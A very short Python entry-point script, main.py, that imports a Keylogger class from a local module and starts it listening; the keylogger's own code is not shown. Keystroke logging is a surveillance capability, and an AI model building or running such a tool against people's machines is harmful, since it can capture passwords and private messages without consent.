# main.py
from .common.keylogger import Keylogger
if __name__ == "__main__":
    # Create a new instance of the application
    app = Keylogger()

    # Run the application
    app.start_listening()